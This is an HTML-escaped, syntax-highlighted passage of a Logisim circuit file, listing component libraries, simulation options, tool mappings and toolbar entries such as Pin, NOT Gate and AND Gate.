&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;lib &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;desc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;#Gates&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;lib &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;desc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;#Plexers&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;2&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;lib &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;desc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;#Arithmetic&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;3&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;lib &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;desc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;#Memory&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;4&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;lib &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;desc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;#I&#x2F;O&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;5&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;lib &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;desc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;#TTL&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;6&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;lib &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;desc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;#TCL&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;7&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;lib &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;desc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;#Base&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;8&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;lib &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;desc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;#BFH-Praktika&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;9&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;lib &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;desc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;#Input&#x2F;Output-Extra&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;10&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;lib &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;desc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;#Soc&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;11&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;main &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;main&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;options&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;gateUndefined&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;ignore&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;simlimit&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1000&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;simrand&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;options&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;mappings&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;tool &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;8&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;map&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Button2&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Poke Tool&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;tool &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;8&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;map&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Button3&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Menu Tool&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;tool &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;8&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;map&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Ctrl Button1&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Menu Tool&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;mappings&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;toolbar&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;tool &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;8&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Poke Tool&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;tool &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;8&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Edit Tool&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;tool &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;8&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Wiring Tool&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;tool &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;8&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Text Tool&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;sep&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;tool &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Pin&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;tool &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Pin&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;facing&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;west&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;output&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;true&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;tool&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;sep&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;tool &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;NOT Gate&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;tool &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;AND Gate&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
